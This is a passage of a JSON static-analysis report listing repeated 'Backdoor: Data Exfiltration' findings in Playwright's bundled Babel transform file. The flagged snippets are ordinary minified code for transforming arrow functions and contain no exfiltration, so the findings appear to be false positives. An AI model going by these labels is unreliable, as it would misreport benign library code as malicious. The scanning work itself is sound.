            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 6520,
                  "endLine": 66,
                  "endColumn": 6525,
                  "snippet": {
                    "text": "}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,fnPath:e}}function Qoe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpre",
                    "rendered": {
                      "text": "}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,fnPath:e}}function Qoe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpre",
                      "markdown": "`}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,fnPath:e}}function Qoe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpre`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 6422,
                  "endLine": 66,
                  "endColumn": 6427,
                  "snippet": {
                    "text": "on({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,",
                    "rendered": {
                      "text": "on({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,",
                      "markdown": "`on({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(o.length>0||!t)&&(p=tle(i,a),(t||a&&GA(i))&&(o.forEach(m=>{let b=m.isJSX()?Boe(p):At(p);b.loc=m.node.loc,m.replaceWith(b)}),t||(p=null))),{thisBinding:p,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 6269,
                  "endLine": 66,
                  "endColumn": 6274,
                  "snippet": {
                    "text": "guration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(",
                    "rendered": {
                      "text": "guration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(",
                      "markdown": "`guration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContainer(\"arguments\",Io()),b.replaceWith(Qr(F,At(\"call\"))),o.push(y.get(\"arguments.0\"))):v?y.replaceWith(F):D?(b.replaceWith(ra(Qr(F,At(\"bind\"),!1),[Io()])),o.push(b.get(\"arguments.0\"))):b.replaceWith(F)})}let p;return(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 6056,
                  "endLine": 66,
                  "endColumn": 6061,
                  "snippet": {
                    "text": "or(\"When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContain",
                    "rendered": {
                      "text": "or(\"When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContain",
                      "markdown": "`or(\"When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");c.reduce((b,d)=>b.concat(Zoe(d)),[]).forEach(b=>{let d=b.node.computed?\"\":b.get(\"property\").node.name,y=b.parentPath,v=y.isAssignmentExpression({left:b.node}),I=y.isCallExpression({callee:b.node}),D=y.isTaggedTemplateExpression({tag:b.node}),O=nle(i,v,d),_=[];if(b.node.computed&&_.push(b.get(\"property\").node),v){let R=y.node.right;_.push(R)}let F=ra(At(O),_);I?(y.unshiftContain`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 5291,
                  "endLine": 66,
                  "endColumn": 5296,
                  "snippet": {
                    "text": "s not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");let m=[];i.traverse(zoe,{allSuperCalls:m});let b=rle(i);m.forEach(d=>{let y=At(b);y.loc=d.node.callee.loc,d.get(\"callee\").replaceWith(y)})}if(l.length>0){let m=Oo(i,\"arguments\",()=>{let b=()=>At(\"arguments\");return i.scope.path.isProgram()?Noe(r0(\"===\",Koe(\"typeof\",b()),WA(\"undefined\")),i.scope.buildUndefinedNode(),b()):b()});l.forEach(b=>{let d=At(m);d.loc=b.node.loc,b.replaceWith(d)})}if(u.length>0){let m=O",
                    "rendered": {
                      "text": "s not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");let m=[];i.traverse(zoe,{allSuperCalls:m});let b=rle(i);m.forEach(d=>{let y=At(b);y.loc=d.node.callee.loc,d.get(\"callee\").replaceWith(y)})}if(l.length>0){let m=Oo(i,\"arguments\",()=>{let b=()=>At(\"arguments\");return i.scope.path.isProgram()?Noe(r0(\"===\",Koe(\"typeof\",b()),WA(\"undefined\")),i.scope.buildUndefinedNode(),b()):b()});l.forEach(b=>{let d=At(m);d.loc=b.node.loc,b.replaceWith(d)})}if(u.length>0){let m=O",
                      "markdown": "`s not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.\");let m=[];i.traverse(zoe,{allSuperCalls:m});let b=rle(i);m.forEach(d=>{let y=At(b);y.loc=d.node.callee.loc,d.get(\"callee\").replaceWith(y)})}if(l.length>0){let m=Oo(i,\"arguments\",()=>{let b=()=>At(\"arguments\");return i.scope.path.isProgram()?Noe(r0(\"===\",Koe(\"typeof\",b()),WA(\"undefined\")),i.scope.buildUndefinedNode(),b()):b()});l.forEach(b=>{let d=At(m);d.loc=b.node.loc,b.replaceWith(d)})}if(u.length>0){let m=O`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 4446,
                  "endLine": 66,
                  "endColumn": 4451,
                  "snippet": {
                    "text": ")!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-functions', it's not possi",
                    "rendered": {
                      "text": ")!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-functions', it's not possi",
                      "markdown": "`)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-functions', it's not possi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 4428,
                  "endLine": 66,
                  "endColumn": 4433,
                  "snippet": {
                    "text": "){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-function",
                    "rendered": {
                      "text": "){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-function",
                      "markdown": "`){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({kind:\"constructor\"});if(i.isClassProperty()||i.isClassPrivateProperty())if(s)i=s;else if(r)e.replaceWith(ra(a0([],Woe(e.node)),[])),i=e.get(\"callee\"),e=i.get(\"body\");else throw e.buildCodeFrameError(\"Unable to transform arrow inside class property\");let{thisPaths:o,argumentsPaths:l,newTargetPaths:u,superProps:c,superCalls:f}=ile(e);if(a&&f.length>0){if(!r)throw f[0].buildCodeFrameError(\"When using '@babel/plugin-transform-arrow-function`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 3990,
                  "endLine": 66,
                  "endColumn": 3995,
                  "snippet": {
                    "text": ",init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({ki",
                    "rendered": {
                      "text": ",init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({ki",
                      "markdown": "`,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.isClassProperty({static:!1})||m.isClassPrivateProperty({static:!1})}),a=i.isClassMethod({ki`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 3899,
                  "endLine": 66,
                  "endColumn": 3904,
                  "snippet": {
                    "text": "?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.",
                    "rendered": {
                      "text": "?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.",
                      "markdown": "`?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)}},s0.default]);function KA(e,t=!0,r=!0,n=!0){let s,i=e.findParent(m=>{if(m.isArrowFunctionExpression()){var b;return(b=s)!=null||(s=m),!1}return m.isFunction()||m.isProgram()||m.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 3707,
                  "endLine": 66,
                  "endColumn": 3712,
                  "snippet": {
                    "text": "ow this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let{thisBinding:n,fnPath:s}=KA(this,r,e,t);if(s.ensureBlock(),Xoe(s,\"FunctionExpression\"),!r){let i=n?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper",
                    "rendered": {
                      "text": "ow this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let{thisBinding:n,fnPath:s}=KA(this,r,e,t);if(s.ensureBlock(),Xoe(s,\"FunctionExpression\"),!r){let i=n?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper",
                      "markdown": "`ow this.buildCodeFrameError(\"Cannot convert non-arrow function to a function expression.\");let{thisBinding:n,fnPath:s}=KA(this,r,e,t);if(s.ensureBlock(),Xoe(s,\"FunctionExpression\"),!r){let i=n?null:s.scope.generateUidIdentifier(\"arrowCheckId\");return i&&s.parentPath.scope.push({id:i,init:Roe([])}),s.get(\"body\").unshiftContainer(\"body\",$A(ra(this.hub.addHelper(\"newArrowCheck\"),[Io(),At(i?i.name:n)]))),s.replaceWith(ra(Qr((0,Ooe.default)(this,!0)||s.node,At(\"bind\")),[i?At(i.name):Io()])),s.get(\"callee.object\")}return s}var zoe=(0,i0.merge)([{CallExpression(e,{allSuperCalls:t}){e.get(\"callee\").isSuper`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 2829,
                  "endLine": 66,
                  "endColumn": 2834,
                  "snippet": {
                    "text": "t\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameEr",
                    "rendered": {
                      "text": "t\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameEr",
                      "markdown": "`t\");if(!t)throw new Error(\"Can't convert node without a body\");if(e.isBlockStatement())return t;let r=[],n=\"body\",s,i;e.isStatement()?(i=\"body\",s=0,r.push(e.node)):(n+=\".body.0\",this.isFunction()?(s=\"argument\",r.push(Uoe(e.node))):(s=\"expression\",r.push($A(e.node)))),this.node.body=_oe(r);let a=this.get(n);return e.setup(a,i?a.node[i]:a.node,i,s),this.node}ai.arrowFunctionToShadowed=function(){this.isArrowFunctionExpression()&&this.arrowFunctionToExpression()};function Yoe(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameEr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
